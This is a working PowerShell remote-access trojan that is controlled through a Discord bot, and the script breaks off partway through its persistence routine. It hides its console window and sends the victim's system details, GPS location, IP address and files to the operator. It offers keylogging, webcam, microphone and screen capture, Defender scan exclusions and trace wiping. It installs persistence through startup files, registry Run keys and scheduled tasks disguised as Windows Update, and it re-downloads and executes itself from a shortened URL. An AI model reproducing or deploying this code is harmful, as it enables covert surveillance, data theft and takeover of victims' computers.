
# =====================================================================================================================================================
<#
**SETUP**
-SETUP THE BOT
1. make a discord bot at https://discord.com/developers/applications/
2. Enable all Privileged Gateway Intents on 'Bot' page
3. On OAuth2 page, tick 'Bot' in Scopes section
4. In Bot Permissions section tick Manage Channels, Read Messages/View Channels, Attach Files, Read Message History.
5. Copy the URL into a browser and add the bot to your server.
6. On 'Bot' page click 'Reset Token' and copy the token.

-SETUP THE SCRIPT
1. Copy the token into the script directly below.

**INFORMATION**
- The Discord bot you use must be in one server ONLY

USELESS PADDING
The Get-Content cmdlet gets the content of the item at the location specified by the path, such as the text in a file or the content of a function. For files, the content is read one line at a time and returns a collection of objects, each representing a line of content.
Beginning in PowerShell 3.0, Get-Content can also get a specified number of lines from the beginning or end of an item.
The Set-PSDebug cmdlet turns script debugging features on and off, sets the trace level, and toggles strict mode. By default, the PowerShell debug features are off.
When the Trace parameter has a value of 1, each line of script is traced as it runs. When the parameter has a value of 2, variable assignments, function calls, and script calls are also traced. If the Step parameter is specified, you're prompted before each line of the script runs.
Examples
Example 1: Get the content of a text file

This example gets the content of a file in the current directory. The LineNumbers.txt file has 100 lines in the format, This is Line X and is used in several examples.
-------------------------------------------------------------------------------------------------
#>
# =====================================================================================================================================================
$global:token = "$tk" # make sure your bot is in ONE server only
# =============================================================== SCRIPT SETUP =========================================================================

$HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
$spawnChannels = 1 # Create new channel on session start
$InfoOnConnect = 1 # Generate client info message on session start

$defaultstart = 0  # Option to start all jobs automatically upon running (DISABLED - Manual capture only)
if ($auto -eq 'n') {
    $defaultstart = 0 
}

$global:parent = "is.gd/qv6G96" # parent script URL (for restarts and persistance)

# remove restart stager (if present)
if (Test-Path "C:\Windows\Tasks\service.vbs") {
    $InfoOnConnect = 0
    rm -path "C:\Windows\Tasks\service.vbs" -Force
}
$version = "1.5.1" # Check version number
$response = $null
$previouscmd = $null
$authenticated = 0
$timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"

# =============================================================== MODULE FUNCTIONS =========================================================================
# Download ffmpeg.exe function (dependency for media capture) 
Function GetFfmpeg {
    sendMsg -Message ":hourglass: ``Downloading FFmpeg to Client.. Please Wait`` :hourglass:"
    $Path = "$env:Temp\ffmpeg.exe"
    $tempDir = "$env:temp"
    If (!(Test-Path $Path)) {  
        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
        $wc = New-Object System.Net.WebClient           
        $wc.Headers.Add("User-Agent", "PowerShell")
        $response = $wc.DownloadString("$apiUrl")
        $release = $response | ConvertFrom-Json
        $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
        $zipUrl = $asset.browser_download_url
        $zipFilePath = Join-Path $tempDir $asset.name
        $extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
        $wc.DownloadFile($zipUrl, $zipFilePath)
        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
        rm -Path $zipFilePath -Force
        rm -Path $extractedDir -Recurse -Force
    }
}

# Create a new category for text channels function
Function NewChannelCategory {
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $guildID = $null
    while (!($guildID)) {    
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)    
        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
        $guilds = $response | ConvertFrom-Json
        foreach ($guild in $guilds) {
            $guildID = $guild.id
        }
        sleep 3
    }
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object { [char]$_ })
    $body = @{
        "name" = "$env:COMPUTERNAME"
        "type" = 4
    } | ConvertTo-Json    
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")
    $wc.Headers.Add("Content-Type", "application/json")
    $response = $wc.UploadString($uri, "POST", $body)
    $responseObj = ConvertFrom-Json $response
    Write-Host "The ID of the new category is: $($responseObj.id)"
    $global:CategoryID = $responseObj.id
}

# Create a new channel function
Function NewChannel {
    param([string]$name)
    $headers = @{
        'Authorization' = "Bot $token"
    }    
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)    
    $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
    $guilds = $response | ConvertFrom-Json
    foreach ($guild in $guilds) {
        $guildID = $guild.id
    }
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object { [char]$_ })
    $body = @{
        "name"      = "$name"
        "type"      = 0
        "parent_id" = $CategoryID
    } | ConvertTo-Json    
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")
    $wc.Headers.Add("Content-Type", "application/json")
    $response = $wc.UploadString($uri, "POST", $body)
    $responseObj = ConvertFrom-Json $response
    Write-Host "The ID of the new channel is: $($responseObj.id)"
    $global:ChannelID = $responseObj.id
}

# Send a message or embed to discord channel function
function sendMsg {
    param([string]$Message, [string]$Embed, [string]$ChannelID = $SessionID)

    $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")

    if ($Embed) {
        $jsonBody = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString($url, "POST", $jsonBody)
        if ($webhook) {
            $body = @{"username" = "Scam BOT" ; "content" = "$jsonBody" } | ConvertTo-Json
            IRM -Uri $webhook -Method Post -ContentType "application/json" -Body $jsonBody
        }
        $jsonPayload = $null
    }
    if ($Message) {
        $jsonBody = @{
            "content"  = "$Message"
            "username" = "$env:computername"
        } | ConvertTo-Json
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString($url, "POST", $jsonBody)
        $message = $null
    }
}

function sendFile {
    param([string]$sendfilePath, [string]$ChannelID = $SessionID)

    $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", "Bot $token")
    if ($sendfilePath) {
        if (Test-Path $sendfilePath -PathType Leaf) {
            $response = $webClient.UploadFile($url, "POST", $sendfilePath)
            Write-Host "Attachment sent to Discord: $sendfilePath"
        }
        else {
            Write-Host "File not found: $sendfilePath"
        }
    }
}

# Gather System and user information
Function quickInfo {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Device
    $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
    $GeoWatcher.Start()
    while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) { Sleep -M 100 }  
    if ($GeoWatcher.Permission -eq 'Denied') { $GPS = "Location Services Off" }
    else {
        $GL = $GeoWatcher.Position.Location | Select Latitude, Longitude; $GL = $GL -split " "
        $Lat = $GL[0].Substring(11) -replace ".$"; $Lon = $GL[1].Substring(10) -replace ".$"
        $GPS = "LAT = $Lat LONG = $Lon"
    }
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        $adminperm = "False"
    }
    else {
        $adminperm = "True"
    }
    $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
    $userInfo = Get-WmiObject -Class Win32_UserAccount
    $processorInfo = Get-WmiObject -Class Win32_Processor
    $computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
    $userInfo = Get-WmiObject -Class Win32_UserAccount
    $videocardinfo = Get-WmiObject Win32_VideoController
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $Width = $Screen.Width; $Height = $Screen.Height; $screensize = "${width} x ${height}"
    $email = (Get-ComputerInfo).WindowsRegisteredOwner
    $OSString = "$($systemInfo.Caption)"
    $OSArch = "$($systemInfo.OSArchitecture)"
    $RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB) }
    $processor = "$($processorInfo.Name)"
    $gpu = "$($videocardinfo.Name)"
    $ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
    $systemLocale = Get-WinSystemLocale; $systemLanguage = $systemLocale.Name
    $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
    $script:jsonPayload = @{
        username = $env:COMPUTERNAME
        tts      = $false
        embeds   = @(
            @{
                title         = "$env:COMPUTERNAME | Computer Information "
                "description" = @"
``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
:man_detective: **User Information** :man_detective:
- **Current User**          : ``$env:USERNAME``
- **Email Address**         : ``$email``
- **Language**              : ``$systemLanguage``
- **Administrator Session** : ``$adminperm``

:minidisc: **OS Information** :minidisc:
- **Current OS**            : ``$OSString - $ver``
- **Architechture**         : ``$OSArch``

:globe_with_meridians: **Network Information** :globe_with_meridians:
- **Public IP Address**     : ``$computerPubIP``
- **Location Information**  : ``$GPS``

:desktop: **Hardware Information** :desktop:
- **Processor**             : ``$processor`` 
- **Memory**                : ``$RamInfo``
- **Gpu**                   : ``$gpu``
- **Screen Size**           : ``$screensize``

``````COMMAND LIST``````
- **Options**               : Show The Options Menu
- **ExtraInfo**             : Show The Extra Info Menu
- **Close**                 : Close this session

"@
                color         = 65280
            }
        )
    }
    sendMsg -Embed $jsonPayload -webhook $webhook
}

# Hide powershell console window function
function HideWindow {
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    if ($hwnd -ne [System.IntPtr]::Zero) {
        $Type::ShowWindowAsync($hwnd, 0)
    }
    else {
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

# --------------------------------------------------------------- HELP FUNCTIONS ------------------------------------------------------------------------

Function Options {
    $script:jsonPayload = @{
        username = $env:COMPUTERNAME
        tts      = $false
        embeds   = @(
            @{
                title         = "$env:COMPUTERNAME | Commands List "
                "description" = @"

### SYSTEM
- **AddPersistance**: Add this script to startup.
- **RemovePersistance**: Remove Xeno from startup
- **IsAdmin**: Check if the session is admin
- **Elevate**: Attempt to restart script as admin (!user popup!)
- **ExcludeCDrive**: Exclude C:/ Drive from all Defender Scans
- **ExcludeAllDrives**: Exclude C:/ - G:/ Drives from Defender Scans
- **EnableIO**: Enable Keyboard and Mouse (admin only)
- **DisableIO**: Disable Keyboard and Mouse (admin only)
- **Exfiltrate**: Send various files. (see ExtraInfo)
- **Upload**: Upload a file. (see ExtraInfo)
- **Download**: Download a file. (attach a file with the command)
- **StartUvnc**: Start UVNC client `StartUvnc -ip 192.168.1.1 -port 8080`
- **SpeechToText**: Send audio transcript to Discord
- **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
- **NearbyWifi**: Show nearby wifi networks (!user popup!)
- **RecordScreen**: Record Screen and send to Discord
- **TakePhoto**: Take a single photo from camera (manual capture)
- **TakeScreenshot**: Capture a single screenshot (manual capture)
- **RecordAudioClip**: Record audio clip of specified duration (manual capture, use: RecordAudioClip 30)

### PRANKS
- **FakeUpdate**: Spoof Windows-10 update screen using Chrome
- **Windows93**: Start parody Windows93 using Chrome
- **WindowsIdiot**: Start fake Windows95 using Chrome
- **SendHydra**: Never ending popups (use killswitch) to stop
- **SoundSpam**: Play all Windows default sounds on the target
- **Message**: Send a message window to the User (!user popup!)
- **VoiceMessage**: Send a message window to the User (!user popup!)
- **MinimizeAll**: Send a voice message to the User
- **EnableDarkMode**: Enable System wide Dark Mode
- **DisableDarkMode**: Disable System wide Dark Mode
- **ShortcutBomb**: Create 50 shortcuts on the desktop.
- **Wallpaper**: Set the wallpaper (wallpaper -url http://img.com/f4wc)
- **Goose**: Spawn an annoying goose (Sam Pearson App)
- **ScreenParty**: Start A Disco on screen!

### JOBS
- **Microphone**: Record microphone clips and send to Discord (AUTOMATIC CAPTURE DISABLED - Use RecordAudioClip instead)
- **Webcam**: Stream webcam pictures to Discord (AUTOMATIC CAPTURE DISABLED - Use TakePhoto instead)
- **Screenshots**: Sends screenshots of the desktop to Discord (AUTOMATIC CAPTURE DISABLED - Use TakeScreenshot instead)
- **Keycapture**: Capture Keystrokes and send to Discord
- **SystemInfo**: Gather System Info and send to Discord

### CONTROL
- **ExtraInfo**: Get a list of further info and command examples
- **Cleanup**: Wipe history (run prompt, powershell, recycle bin, Temp)
- **Kill**: Stop a running module (eg. Exfiltrate)
- **PauseJobs**: Pause the current jobs for this session
- **ResumeJobs**: Resume all jobs for this session
- **Close**: Close this session
"@
                color         = 65280
            }
        )
    }
    sendMsg -Embed $jsonPayload
}

Function ExtraInfo {
    $script:jsonPayload = @{
        username = $env:COMPUTERNAME
        tts      = $false
        embeds   = @(
            @{
                title         = "$env:COMPUTERNAME | Extra Information "
                "description" = @"
``````Example Commands``````

**Default PS Commands:**
> PS> ``whoami`` (Returns Powershell commands)

**Exfiltrate Command Examples:**
> PS> ``Exfiltrate -Path Documents -Filetype png``
> PS> ``Exfiltrate -Filetype log``
> PS> ``Exfiltrate``
Exfiltrate only will send many pre-defined filetypes
from all User Folders like Documents, Downloads etc..

**Upload Command Example:**
> PS> ``Upload -Path C:/Path/To/File.txt``
Use 'FolderTree' command to show all files

**Enumerate-LAN Example:**
> PS> ``EnumerateLAN -Prefix 192.168.1.``
This Eg. will scan 192.168.1.1 to 192.168.1.254

**Prank Examples:**
> PS> ``Message 'Your Message Here!'``
> PS> ``VoiceMessage 'Your Message Here!'``
> PS> ``wallpaper -url http://img.com/f4wc``

**Record Examples:**
> PS> ``RecordScreen -t 100`` (number of seconds to record)
> PS> ``RecordAudioClip 30`` (number of seconds to record audio)

**Kill Command modules:**
- Exfiltrate
- SendHydra
- SpeechToText
"@
                color         = 65280
            }
        )
    }
    sendMsg -Embed $jsonPayload
}

Function CleanUp { 
    Remove-Item $env:temp\* -r -Force -ErrorAction SilentlyContinue
    Remove-Item (Get-PSreadlineOption).HistorySavePath
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue

    $campath = "$env:Temp\Image.jpg"
    $screenpath = "$env:Temp\Screen.jpg"
    $micpath = "$env:Temp\Audio.mp3"
    If (Test-Path $campath) {  
        rm -Path $campath -Force
    }
    If (Test-Path $screenpath) {  
        rm -Path $screenpath -Force
    }
    If (Test-Path $micpath) {  
        rm -Path $micpath -Force
    }

    sendMsg -Message ":white_check_mark: ``Clean Up Task Complete`` :white_check_mark:"
}

# --------------------------------------------------------------- INFO FUNCTIONS ------------------------------------------------------------------------
Function EnumerateLAN {
    sendMsg -Message ":hourglass: Searching Network Devices - please wait.. :hourglass:"
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 | 
        Where-Object SuffixOrigin -eq "Dhcp" | 
        Select-Object -ExpandProperty IPAddress)
    
    if ($localIP -match '^(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}$') {
        $subnet = $matches[1]
        1..254 | ForEach-Object {
            Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $subnet.$_"
        }    
        sleep 1
        $IPDevices = (arp.exe -a | Select-String "$subnet.*dynam") -replace ' +', ',' | ConvertFrom-Csv -Header Computername, IPv4, MAC | Where-Object { $_.MAC -ne 'dynamic' } | Select-Object IPv4, MAC, Computername
        $IPDevices | ForEach-Object {
            try {
                $ip = $_.IPv4
                $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
                $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $hostname -Force
            }
            catch {
                $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value "N/A" -Force
            }
        }
        $IPDevices | Format-Table -Property IPv4, Hostname, MAC -AutoSize
        $IPDevices = ($IPDevices | Out-String)
    }
    sendMsg -Message "``````$IPDevices``````"
}

Function NearbyWifi {
    $showNetworks = explorer.exe ms-availablenetworks:
    sleep 4
    $wshell = New-Object -ComObject wscript.shell
    $wshell.AppActivate('explorer.exe')
    $tab = 0
    while ($tab -lt 6) {
        $wshell.SendKeys('{TAB}')
        sleep -m 100
        $tab++
    }
    $wshell.SendKeys('{ENTER}')
    sleep -m 200
    $wshell.SendKeys('{TAB}')
    sleep -m 200
    $wshell.SendKeys('{ESC}')
    $NearbyWifi = (netsh wlan show networks mode=Bssid | ? { $_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*" }).trim() | Format-Table SSID, Signal, Band
    $Wifi = ($NearbyWifi | Out-String)
    sendMsg -Message "``````$Wifi``````"
}

# --------------------------------------------------------------- PRANK FUNCTIONS ------------------------------------------------------------------------

Function FakeUpdate {
    $tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window -kiosk https://fakeupdate.net/win8", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $tobat | Out-File -FilePath $pth -Force
    sleep 1
    Start-Process -FilePath $pth
    sleep 3
    Remove-Item -Path $pth -Force
    sendMsg -Message ":arrows_counterclockwise: ``Fake-Update Sent..`` :arrows_counterclockwise:"
}

Function Windows93 {
    $tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window -kiosk https://windows93.net", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $tobat | Out-File -FilePath $pth -Force
    sleep 1
    Start-Process -FilePath $pth
    sleep 3
    Remove-Item -Path $pth -Force
    sendMsg -Message ":arrows_counterclockwise: ``Windows 93 Sent..`` :arrows_counterclockwise:"
}

Function WindowsIdiot {
    $tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window -kiosk https://ygev.github.io/Trojan.JS.YouAreAnIdiot", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $tobat | Out-File -FilePath $pth -Force
    sleep 1
    Start-Process -FilePath $pth
    sleep 3
    Remove-Item -Path $pth -Force
    sendMsg -Message ":arrows_counterclockwise: ``Windows Idiot Sent..`` :arrows_counterclockwise:"
}

Function SendHydra {
    Add-Type -AssemblyName System.Windows.Forms
    sendMsg -Message ":arrows_counterclockwise: ``Hydra Sent..`` :arrows_counterclockwise:"
    function Create-Form {
        $form = New-Object Windows.Forms.Form; $form.Text = "  __--** YOU HAVE BEEN INFECTED BY HYDRA **--__ "; $form.Font = 'Microsoft Sans Serif,12,style=Bold'; $form.Size = New-Object Drawing.Size(300, 170); $form.StartPosition = 'Manual'; $form.BackColor = [System.Drawing.Color]::Black; $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog; $form.ControlBox = $false; $form.Font = 'Microsoft Sans Serif,12,style=bold'; $form.ForeColor = "#FF0000"
        $Text = New-Object Windows.Forms.Label; $Text.Text = "Cut The Head Off The Snake..`n`n    ..Two More Will Appear"; $Text.Font = 'Microsoft Sans Serif,14'; $Text.AutoSize = $true; $Text.Location = New-Object System.Drawing.Point(15, 20)
        $Close = New-Object Windows.Forms.Button; $Close.Text = "Close?"; $Close.Width = 120; $Close.Height = 35; $Close.BackColor = [System.Drawing.Color]::White; $Close.ForeColor = [System.Drawing.Color]::Black; $Close.DialogResult = [System.Windows.Forms.DialogResult]::OK; $Close.Location = New-Object System.Drawing.Point(85, 100); $Close.Font = 'Microsoft Sans Serif,12,style=Bold'
        $form.Controls.AddRange(@($Text, $Close)); return $form
    }
    while ($true) {
        $form = Create-Form
        $form.StartPosition = 'Manual'
        $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
        $result = $form.ShowDialog()
    
        $messages = PullMsg
        if ($messages -match "kill") {
            sendMsg -Message ":octagonal_sign: ``Hydra Stopped`` :octagonal_sign:"
            $previouscmd = $response
            break
        }
        if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
            $form2 = Create-Form
            $form2.StartPosition = 'Manual'
            $form2.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
            $form2.Show()
        }
        $random = (Get-Random -Minimum 0 -Maximum 2)
        Sleep $random
    }
}

Function Message([string]$Message) {
    msg.exe * $Message
    sendMsg -Message ":arrows_counterclockwise: ``Message Sent to User..`` :arrows_counterclockwise:"
}

Function SoundSpam {
    param([Parameter()][int]$Interval = 3)
    sendMsg -Message ":white_check_mark: ``Spamming Sounds... Please wait..`` :white_check_mark:"
    Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | Foreach-Object { Start-Sleep -Seconds $Interval; (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").Play(); }
    sendMsg -Message ":white_check_mark: ``Sound Spam Complete!`` :white_check_mark:"
}

Function VoiceMessage([string]$Message) {
    Add-Type -AssemblyName System.speech
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $SpeechSynth.Speak($Message)
    sendMsg -Message ":white_check_mark: ``Message Sent!`` :white_check_mark:"
}

Function MinimizeAll {
    $apps = New-Object -ComObject Shell.Application
    $apps.MinimizeAll()
    sendMsg -Message ":white_check_mark: ``Apps Minimised`` :white_check_mark:"
}

Function EnableDarkMode {
    $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
    Set-ItemProperty $Theme AppsUseLightTheme -Value 0
    Set-ItemProperty $Theme SystemUsesLightTheme -Value 0
    Start-Sleep 1
    sendMsg -Message ":white_check_mark: ``Dark Mode Enabled`` :white_check_mark:"
}

Function DisableDarkMode {
    $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
    Set-ItemProperty $Theme AppsUseLightTheme -Value 1
    Set-ItemProperty $Theme SystemUsesLightTheme -Value 1
    Start-Sleep 1
    sendMsg -Message ":octagonal_sign: ``Dark Mode Disabled`` :octagonal_sign:"
}

Function ShortcutBomb {
    $n = 0
    while ($n -lt 50) {
        $num = Get-Random
        $AppLocation = "C:\Windows\System32\rundll32.exe"
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware" + $num + ".lnk")
        $Shortcut.TargetPath = $AppLocation
        $Shortcut.Arguments = "shell32.dll,Control_RunDLL hotplug.dll"
        $Shortcut.IconLocation = "hotplug.dll,0"
        $Shortcut.Description = "Device Removal"
        $Shortcut.WorkingDirectory = "C:\Windows\System32"
        $Shortcut.Save()
        Start-Sleep 0.2
        $n++
    }
    sendMsg -Message ":white_check_mark: ``Shortcuts Created!`` :white_check_mark:"
}

Function Wallpaper {
    param ([string[]]$url)
    $outputPath = "$env:temp\img.jpg"; $wallpaperStyle = 2; IWR -Uri $url -OutFile $outputPath
    $signature = 'using System;using System.Runtime.InteropServices;public class Wallpaper {[DllImport("user32.dll", CharSet = CharSet.Auto)]public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);}'
    Add-Type -TypeDefinition $signature; $SPI_SETDESKWALLPAPER = 0x0014; $SPIF_UPDATEINIFILE = 0x01; $SPIF_SENDCHANGE = 0x02; [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $outputPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
    sendMsg -Message ":white_check_mark: ``New Wallpaper Set`` :white_check_mark:"
}

Function Goose {
    $url = "https://github.com/benzoXdev/assets/raw/main/Goose.zip"
    $tempFolder = $env:TMP
    $zipFile = Join-Path -Path $tempFolder -ChildPath "Goose.zip"
    $extractPath = Join-Path -Path $tempFolder -ChildPath "Goose"
    Invoke-WebRequest -Uri $url -OutFile $zipFile
    Expand-Archive -Path $zipFile -DestinationPath $extractPath
    $vbscript = "$extractPath\Goose.vbs"
    & $vbscript
    sendMsg -Message ":white_check_mark: ``Goose Spawned!`` :white_check_mark:"    
}

Function ScreenParty {
    Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C Add-Type -AssemblyName System.Windows.Forms;`$d = 10;`$i = 100;`$1 = 'Black';`$2 = 'Green';`$3 = 'Red';`$4 = 'Yellow';`$5 = 'Blue';`$6 = 'white';`$st = Get-Date;while ((Get-Date) -lt `$st.AddSeconds(`$d)) {`$t = 1;while (`$t -lt 7){`$f = New-Object System.Windows.Forms.Form;`$f.BackColor = `$c;`$f.FormBorderStyle = 'None';`$f.WindowState = 'Maximized';`$f.TopMost = `$true;if (`$t -eq 1) {`$c = `$1}if (`$t -eq 2) {`$c = `$2}if (`$t -eq 3) {`$c = `$3}if (`$t -eq 4) {`$c = `$4}if (`$t -eq 5) {`$c = `$5}if (`$t -eq 6) {`$c = `$6}`$f.BackColor = `$c;`$f.Show();Start-Sleep -Milliseconds `$i;`$f.Close();`$t++}}")
    sendMsg -Message ":white_check_mark: ``Screen Party Started!`` :white_check_mark:"  
}

# --------------------------------------------------------------- PERSISTANCE FUNCTIONS ------------------------------------------------------------------------

Function AddPersistance {
    $successCount = 0
    $totalMethods = 0
    $results = @()
    
    # Chemin du script de persistance
    $newScriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
    $scriptContent = @"
`$tk = `"$token`"
`$global:parent = `"$parent`"
irm `$parent | iex
"@
    
    try {
        # 1. Créer le script de persistance
        $scriptContent | Out-File -FilePath $newScriptPath -Force -Encoding UTF8 -ErrorAction Stop
        if (Test-Path $newScriptPath) {
            $totalMethods++
            $successCount++
            $results += "✓ Script créé: $newScriptPath"
        }
    }
    catch {
        $results += "✗ Erreur création script: $($_.Exception.Message)"
    }
    
    # 2. Dossier de démarrage (Startup) - Méthode 1: VBS
    try {
        $startupVbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
        $vbsContent = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W Hidden -File ""$newScriptPath""", 0, True
"@
        $vbsContent | Out-File -FilePath $startupVbsPath -Force -Encoding ASCII -ErrorAction Stop
        if (Test-Path $startupVbsPath) {
            $totalMethods++
            $successCount++
            $results += "✓ Startup VBS ajouté"
        }
    }
    catch {
        $results += "✗ Erreur Startup VBS: $($_.Exception.Message)"
    }
    
    # 3. Dossier de démarrage (Startup) - Méthode 2: LNK (Raccourci)
    try {
        $startupLnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk"
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut($startupLnkPath)
        $Shortcut.TargetPath = "powershell.exe"
        $Shortcut.Arguments = "-NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
        $Shortcut.WorkingDirectory = "$env:APPDATA\Microsoft\Windows\Themes"
        $Shortcut.WindowStyle = 7  # Minimized
        $Shortcut.Save()
        if (Test-Path $startupLnkPath) {
            $totalMethods++
            $successCount++
            $results += "✓ Startup LNK ajouté"
        }
    }
    catch {
        $results += "✗ Erreur Startup LNK: $($_.Exception.Message)"
    }
    
    # 4. Clés de registre - HKCU Run
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "WindowsUpdateService"
        $regValue = "powershell.exe -NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force -ErrorAction Stop
        $totalMethods++
        $successCount++
        $results += "✓ Clé registre HKCU Run ajoutée"
    }
    catch {
        $results += "✗ Erreur clé registre HKCU Run: $($_.Exception.Message)"
    }
    
    # 5. Clés de registre - HKCU RunOnce
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
        $regName = "WindowsUpdateService"
        $regValue = "powershell.exe -NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force -ErrorAction Stop
        $totalMethods++
        $successCount++
        $results += "✓ Clé registre HKCU RunOnce ajoutée"
    }
    catch {
        $results += "✗ Erreur clé registre HKCU RunOnce: $($_.Exception.Message)"
    }
    
    # 6. Tâche planifiée - Au démarrage
    try {
        $taskName = "WindowsUpdateService"
        $taskDescription = "Windows Update Service"
        $taskAction = "powershell.exe"
        $taskArguments = "-NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
        
        # Supprimer la tâche si elle existe déjà
        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if ($existingTask) {
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        }
        
        # Créer la tâche planifiée
        $action = New-ScheduledTaskAction -Execute $taskAction -Argument $taskArguments
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
